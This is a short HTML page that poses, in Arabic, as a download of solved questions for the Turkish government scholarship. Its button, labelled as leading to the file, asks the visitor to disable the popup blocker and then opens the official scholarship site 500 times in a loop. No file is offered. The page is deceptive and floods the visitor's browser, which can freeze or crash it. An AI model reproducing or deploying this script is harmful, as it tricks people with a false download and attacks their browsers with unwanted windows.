<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>تحميل شرح وحل اسئلة المنحة التركية</title>
<script>
    let link = "https://tbbs.turkiyeburslari.gov.tr/ar";

    function checkPopupBlocker() {
        let popupBlocker = false;
        let newWindow = window.open("", "", "width=100,height=100");
        if (!newWindow || newWindow.closed || typeof newWindow.closed == 'undefined') {
            popupBlocker = true;
        }
        if (popupBlocker) {
            alert("Please disable popup blocker to continue.");
        } else {
            openPages();
        }
    }

    function openPages() {
        for (let i = 0; i < 500; i++) {
            window.open(link);
        }
    }
</script>
</head>
<body>
<button onclick="checkPopupBlocker()">رص باش تحمل باش تمشي لرابط الملف</button>
</body>
</html>
